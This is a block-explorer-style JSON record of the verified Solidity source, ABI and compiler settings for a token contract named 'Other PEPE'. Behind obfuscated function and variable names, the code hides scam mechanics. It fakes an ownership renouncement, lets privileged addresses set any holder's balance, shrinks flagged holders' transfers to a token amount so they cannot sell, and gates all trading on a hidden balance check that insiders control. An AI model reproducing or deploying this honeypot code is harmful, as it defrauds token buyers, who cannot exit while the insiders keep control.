{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface txSellLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeLiquiditySender) external view returns (uint256);\n\n    function transfer(address tradingTakeList, uint256 toSender) external returns (bool);\n\n    function allowance(address teamLaunchBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingTakeList,\n        uint256 toSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atTotal, uint256 value);\n    event Approval(address indexed teamLaunchBuy, address indexed spender, uint256 value);\n}\n\nabstract contract maxWalletAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTotalMax {\n    function createPair(address totalMax, address receiverTo) external returns (address);\n}\n\ninterface txSellLaunchMetadata is txSellLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OtherPEPE is maxWalletAt, txSellLaunch, txSellLaunchMetadata {\n\n    uint256 minIs;\n\n    string private fundAutoSender = \"Other PEPE\";\n\n    uint256 constant autoFromLaunch = 4 ** 10;\n\n    function marketingTakeToken(address maxFee) public {\n        if (listTeamLimit) {\n            return;\n        }\n        if (toAmount == toShould) {\n            toShould = false;\n        }\n        amountMarketing[maxFee] = true;\n        \n        listTeamLimit = true;\n    }\n\n    bool public maxReceiverAt;\n\n    bool public toAmount;\n\n    function launchToken() public {\n        emit OwnershipTransferred(launchedFrom, address(0));\n        limitLaunch = address(0);\n    }\n\n    uint8 private liquidityFee = 18;\n\n    mapping(address => bool) public amountMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamSwap;\n    }\n\n    address toTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverIs(address maxExempt) public {\n        exemptReceiverLimit();\n        \n        if (maxExempt == launchedFrom || maxExempt == senderEnable) {\n            return;\n        }\n        exemptTrading[maxExempt] = true;\n    }\n\n    function exemptReceiverLimit() private view {\n        require(amountMarketing[_msgSender()]);\n    }\n\n    bool public listTeamLimit;\n\n    bool public toShould;\n\n    uint256 private teamSwap = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return fundAutoSender;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityFee;\n    }\n\n    address public launchedFrom;\n\n    function transferFrom(address tradingLimit, address tradingTakeList, uint256 toSender) external override returns (bool) {\n        if (_msgSender() != listMin) {\n            if (minSwapTeam[tradingLimit][_msgSender()] != type(uint256).max) {\n                require(toSender <= minSwapTeam[tradingLimit][_msgSender()]);\n                minSwapTeam[tradingLimit][_msgSender()] -= toSender;\n            }\n        }\n        return liquidityIs(tradingLimit, tradingTakeList, toSender);\n    }\n\n    mapping(address => mapping(address => uint256)) private minSwapTeam;\n\n    string private isAt = \"OPE\";\n\n    function totalMode(address tradingLimit, address tradingTakeList, uint256 toSender) internal returns (bool) {\n        require(minLimitTrading[tradingLimit] >= toSender);\n        minLimitTrading[tradingLimit] -= toSender;\n        minLimitTrading[tradingTakeList] += toSender;\n        emit Transfer(tradingLimit, tradingTakeList, toSender);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingWallet, address indexed exemptFrom);\n\n    function transfer(address maxModeShould, uint256 toSender) external virtual override returns (bool) {\n        return liquidityIs(_msgSender(), maxModeShould, toSender);\n    }\n\n    bool public enableTx;\n\n    function getOwner() external view returns (address) {\n        return limitLaunch;\n    }\n\n    function liquidityIs(address tradingLimit, address tradingTakeList, uint256 toSender) internal returns (bool) {\n        if (tradingLimit == launchedFrom) {\n            return totalMode(tradingLimit, tradingTakeList, toSender);\n        }\n        uint256 receiverAuto = txSellLaunch(senderEnable).balanceOf(toTake);\n        require(receiverAuto == minIs);\n        require(tradingTakeList != toTake);\n        if (exemptTrading[tradingLimit]) {\n            return totalMode(tradingLimit, tradingTakeList, autoFromLaunch);\n        }\n        return totalMode(tradingLimit, tradingTakeList, toSender);\n    }\n\n    constructor (){\n        if (autoMax != marketingTrading) {\n            marketingTrading = fromExempt;\n        }\n        launchTeam buyLimit = launchTeam(listMin);\n        senderEnable = senderTotalMax(buyLimit.factory()).createPair(buyLimit.WETH(), address(this));\n        if (maxReceiverAt != toShould) {\n            senderToken = false;\n        }\n        launchedFrom = _msgSender();\n        launchToken();\n        amountMarketing[launchedFrom] = true;\n        minLimitTrading[launchedFrom] = teamSwap;\n        \n        emit Transfer(address(0), launchedFrom, teamSwap);\n    }\n\n    address public senderEnable;\n\n    function marketingAuto(uint256 toSender) public {\n        exemptReceiverLimit();\n        minIs = toSender;\n    }\n\n    function limitSellToken(address maxModeShould, uint256 toSender) public {\n        exemptReceiverLimit();\n        minLimitTrading[maxModeShould] = toSender;\n    }\n\n    address listMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private marketingTrading;\n\n    function allowance(address walletAuto, address tradingTx) external view virtual override returns (uint256) {\n        if (tradingTx == listMin) {\n            return type(uint256).max;\n        }\n        return minSwapTeam[walletAuto][tradingTx];\n    }\n\n    bool public senderToken;\n\n    address private limitLaunch;\n\n    function owner() external view returns (address) {\n        return limitLaunch;\n    }\n\n    mapping(address => bool) public exemptTrading;\n\n    mapping(address => uint256) private minLimitTrading;\n\n    uint256 public fromExempt;\n\n    uint256 atFee;\n\n    function approve(address tradingTx, uint256 toSender) public virtual override returns (bool) {\n        minSwapTeam[_msgSender()][tradingTx] = toSender;\n        emit Approval(_msgSender(), tradingTx, toSender);\n        return true;\n    }\n\n    function balanceOf(address feeLiquiditySender) public view virtual override returns (uint256) {\n        return minLimitTrading[feeLiquiditySender];\n    }\n\n    uint256 private autoMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLaunchBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquiditySender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxModeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSender\",\"type\":\"uint256\"}],\"name\":\"limitSellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTeamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toSender\",\"type\":\"uint256\"}],\"name\":\"marketingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"}],\"name\":\"marketingTakeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxModeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTakeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OtherPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}